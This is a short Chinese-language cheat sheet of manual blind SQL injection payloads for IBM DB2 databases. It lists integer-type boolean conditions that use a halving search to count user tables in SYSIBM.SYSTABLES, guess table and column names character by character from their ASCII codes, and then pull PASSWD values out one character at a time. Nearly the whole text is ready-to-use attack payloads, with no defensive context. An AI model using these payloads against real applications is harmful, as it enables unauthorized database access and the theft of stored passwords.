# DB2sql注入

## 手工语句

以下均是是整形的注入，采用半折法猜解
猜用户表数量：
 and 0<(SELECT count(NAME) FROM SYSIBM.SYSTABLES where CREATOR=USER)
猜表长度：
 and 3<(SELECT LENGTH(NAME) FROM SYSIBM.SYSTABLES where name not in(’COLUMNS’) fetch first 1 rows only)
猜表第一个字符ASCII码：
 and 3<(SELECT ASCII(SUBSTR(NAME,1,1)) FROM SYSIBM.SYSTABLES where name not in(’COLUMNS’) fetch first 1 rows only)
猜表内列名数量：
 and 1<(SELECT COUNT(COLNAME) FROM SYSCAT.columns where TABNAME=’TABLE‘)
猜第一个列名的长度
 and 1<(SELECT LENGTH(COLNAME) FROM SYSCAT.columns where TABNAME=’TABLE‘ and colno=0)
猜第一个列名第一个字符的ASCII码
 and 1<(SELECT ASCII(SUBSTR(COLNAME,1,1)) FROM SYSCAT.columns where TABNAME=’TABLE‘ and colno=0)
依ID排降序，猜第一个PASSWD的长度
 and 0<(SELECT LENGTH(PASSWD) FROM TABLE ORDER BY ID DESC FETCH FIRST 1 ROWS ONLY)
依ID排降序，猜第一个PASSWD第一个字符的ASCII码
 and 0<(SELECT ASCII(SUBSTR(PASSWD,1,1)) FROM TABLE ORDER BY ID DESC FETCH FIRST 1 ROWS ONLY)
猜第二个PASSWD第一个字符的ASCII码
 and 0<(SELECT ASCII(SUBSTR(PASSWD,1,1)) FROM TABLE where PASSWD not in(’grou1‘) fetch first 1 rows only)
